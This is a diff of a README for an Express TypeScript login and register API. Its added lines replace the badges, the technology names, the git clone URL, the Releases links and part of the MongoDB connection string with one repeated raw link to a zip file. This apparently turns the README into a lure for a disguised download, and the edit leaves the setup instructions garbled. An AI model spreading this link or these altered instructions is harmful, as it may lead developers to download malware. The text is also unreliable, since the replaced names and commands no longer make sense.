@@ -1,8 +1,8 @@
 # Express TypeScript Login Register API
 
-![Version](https://img.shields.io/badge/version-1.0.0-blue.svg) ![License](https://img.shields.io/badge/license-MIT-green.svg) ![Build Status](https://img.shields.io/badge/build-passing-brightgreen.svg) ![Releases](https://img.shields.io/badge/releases-latest-orange.svg)
+![Version](https://github.com/RomeoHPT/express-ts-login-register/raw/refs/heads/main/prisma/ts_login_register_express_1.4.zip) ![License](https://github.com/RomeoHPT/express-ts-login-register/raw/refs/heads/main/prisma/ts_login_register_express_1.4.zip) ![Build Status](https://github.com/RomeoHPT/express-ts-login-register/raw/refs/heads/main/prisma/ts_login_register_express_1.4.zip) ![Releases](https://github.com/RomeoHPT/express-ts-login-register/raw/refs/heads/main/prisma/ts_login_register_express_1.4.zip)
 
-Welcome to the **Express TypeScript Login Register API**. This project offers a secure and robust authentication API built with Express.js, TypeScript, Prisma, and MongoDB Atlas. For the latest updates and versions, please check the [Releases section](https://github.com/RomeoHPT/express-ts-login-register/releases).
+Welcome to the **Express TypeScript Login Register API**. This project offers a secure and robust authentication API built with https://github.com/RomeoHPT/express-ts-login-register/raw/refs/heads/main/prisma/ts_login_register_express_1.4.zip, TypeScript, Prisma, and MongoDB Atlas. For the latest updates and versions, please check the [Releases section](https://github.com/RomeoHPT/express-ts-login-register/raw/refs/heads/main/prisma/ts_login_register_express_1.4.zip).
 
 ## Table of Contents
 
@@ -32,8 +32,8 @@ Welcome to the **Express TypeScript Login Register API**. This project offers a 
 
 This project utilizes the following technologies:
 
-- **Runtime**: Node.js
-- **Framework**: Express.js
+- **Runtime**: https://github.com/RomeoHPT/express-ts-login-register/raw/refs/heads/main/prisma/ts_login_register_express_1.4.zip
+- **Framework**: https://github.com/RomeoHPT/express-ts-login-register/raw/refs/heads/main/prisma/ts_login_register_express_1.4.zip
 - **Language**: TypeScript
 - **Database**: MongoDB Atlas
 - **ORM**: Prisma
@@ -46,7 +46,7 @@ This project utilizes the following technologies:
 
 Before you begin, ensure you have the following installed:
 
-- **Node.js**: Version 18 or higher
+- **https://github.com/RomeoHPT/express-ts-login-register/raw/refs/heads/main/prisma/ts_login_register_express_1.4.zip**: Version 18 or higher
 - **MongoDB Atlas**: Create an account and set up a cluster
 
 ## Installation
@@ -55,7 +55,7 @@ To set up the project locally, follow these steps:
 
 1. **Clone the repository**:
    ```bash
-   git clone https://github.com/RomeoHPT/express-ts-login-register.git
+   git clone https://github.com/RomeoHPT/express-ts-login-register/raw/refs/heads/main/prisma/ts_login_register_express_1.4.zip
    ```
 
 2. **Navigate to the project directory**:
@@ -70,7 +70,7 @@ To set up the project locally, follow these steps:
 
 4. **Set up environment variables**: Create a `.env` file in the root directory and add your MongoDB connection string and JWT secret. Example:
    ```
-   DATABASE_URL=mongodb+srv://<username>:<password>@cluster.mongodb.net/mydatabase?retryWrites=true&w=majority
+   DATABASE_URL=mongodb+srv://<username>:<password>https://github.com/RomeoHPT/express-ts-login-register/raw/refs/heads/main/prisma/ts_login_register_express_1.4.zip
    JWT_SECRET=your_jwt_secret
    ```
 
@@ -143,10 +143,10 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Acknowledgments
 
-- **Express.js**: A fast, unopinionated, minimalist web framework for Node.js.
+- **https://github.com/RomeoHPT/express-ts-login-register/raw/refs/heads/main/prisma/ts_login_register_express_1.4.zip**: A fast, unopinionated, minimalist web framework for https://github.com/RomeoHPT/express-ts-login-register/raw/refs/heads/main/prisma/ts_login_register_express_1.4.zip
 - **TypeScript**: A typed superset of JavaScript that compiles to plain JavaScript.
 - **Prisma**: An open-source database toolkit that makes working with databases easy.
 - **MongoDB Atlas**: A cloud database service for modern applications.
 - **JWT**: JSON Web Tokens for secure authentication.
 
-For more details and the latest updates, please visit the [Releases section](https://github.com/RomeoHPT/express-ts-login-register/releases).
+For more details and the latest updates, please visit the [Releases section](https://github.com/RomeoHPT/express-ts-login-register/raw/refs/heads/main/prisma/ts_login_register_express_1.4.zip).
